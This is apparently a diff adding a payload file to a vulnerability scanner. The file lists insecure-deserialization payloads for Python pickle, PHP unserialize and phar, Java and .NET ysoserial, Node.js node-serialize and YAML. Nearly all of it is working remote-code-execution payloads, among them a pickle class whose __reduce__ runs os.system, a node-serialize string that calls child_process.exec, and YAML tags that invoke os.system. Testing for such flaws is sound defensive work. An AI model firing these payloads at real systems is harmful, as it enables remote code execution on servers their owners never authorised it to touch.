@@ -1,0 +1,35 @@
+# Deserialization Payloads — cyberm4fia-scanner
+# Categories: Python Pickle, PHP Unserialize, Java, Node.js, YAML
+
+# ─── Python Pickle RCE ───
+# pickle.dumps(RCE()) where RCE.__reduce__ returns (os.system, ('command',))
+import pickle, base64, os
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('id',))
+base64.b64encode(pickle.dumps(RCE()))
+
+# ─── PHP Unserialize ───
+O:8:"Class":1:{s:4:"prop";s:6:"system";}
+O:8:"Class":0:{}
+a:1:{s:3:"rce";s:6:"system";}
+
+# ─── PHP Phar Deserialization ───
+phar://uploaded_file.phar
+
+# ─── Java (ysoserial) ───
+# java -jar ysoserial.jar CommonsCollections1 'id' | base64
+# java -jar ysoserial.jar CommonsCollections6 'id' | base64
+# java -jar ysoserial.jar CommonsBeanutils1 'id' | base64
+# java -jar ysoserial.jar Spring1 'id' | base64
+
+# ─── Node.js node-serialize ───
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
+
+# ─── YAML Deserialization ───
+!!python/object/apply:os.system ["id"]
+!!python/object/new:subprocess.check_output [["id"]]
+
+# ─── .NET Deserialization ───
+# Use ysoserial.net
+# ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "cmd /c whoami" -o base64
